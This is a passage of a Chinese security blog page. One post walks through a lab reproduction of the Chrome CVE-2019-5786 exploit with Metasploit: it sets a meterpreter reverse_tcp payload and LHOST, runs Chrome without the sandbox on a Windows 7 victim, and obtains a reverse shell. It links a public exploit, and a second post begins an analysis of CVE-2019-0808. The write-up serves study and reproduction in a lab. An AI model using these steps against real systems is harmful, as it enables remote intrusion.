+<p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p>
+<p>漏洞介绍：</p>
+<figure class="highlight plain"><figcaption><span>information:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">  This exploit takes advantage of a use after free vulnerability in </span><br><span class="line">  Google Chrome 72.0.3626.119 running on Windows 7 x86. The </span><br><span class="line">  FileReader.readAsArrayBuffer function can return multiple references </span><br><span class="line">  to the same ArrayBuffer object, which can be freed and overwritten </span><br><span class="line">  with sprayed objects. The dangling ArrayBuffer reference can be used </span><br><span class="line">  to access the sprayed objects, allowing arbitrary memory access from </span><br><span class="line">  Javascript. This is used to write and execute shellcode in a </span><br><span class="line">  WebAssembly object. The shellcode is executed within the Chrome </span><br><span class="line">  sandbox, so you must explicitly disable the sandbox for the payload </span><br><span class="line">  to be successful.</span><br></pre></td></tr></table></figure>
+
+<p>选择payload<br><code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
+<blockquote>
+<p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p>
+</blockquote>
+<p>设置payload参数：LHOST为kali ip<br><code>-&gt; set LHOST 192.168.119.128</code></p>
+<p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p>
+<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
+<p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p>
+<p>启动服务：run 或者exploit</p>
+<p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe<br><code>-&gt; chrome.exe --no-sandbox</code></p>
+<p>在弹出的chome浏览器中访问kali ip:<br><a href="http://192.168.119.128:8080" target="_blank" rel="noopener">http://192.168.119.128:8080</a></p>
+<p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p>
+<p><a href="https://github.com/exodusintel/CVE-2019-5786" target="_blank" rel="noopener">https://github.com/exodusintel/CVE-2019-5786</a> </p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2019-0808" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/CVE-2019-0808/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.276Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/CVE-2019-0808/">CVE-2019-0808</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo），其中渲染进程运行着不可信的HTML和JS代码。浏览器中的每一个tab为一个独立的进程，运行在Untruster的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。</p>
+<ul>
+<li>利用浏览器进程的漏洞，比如IndexedDB,Mojo等</li>
+<li>利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808</li>
+</ul>
+<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>CVE-2019-0808是win32k.sys中的一个空指针解引用漏洞，根据360Blog,漏洞存在于win32k!xxxMNMouseMove函数中：</p>
+<p>首先分析xxxMNMouseMove函数：</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Sinky-wang
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://Visionaryxx.github.io" target="_blank">Visionary'blog</a> by Visionary
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
+</body>
+</html>
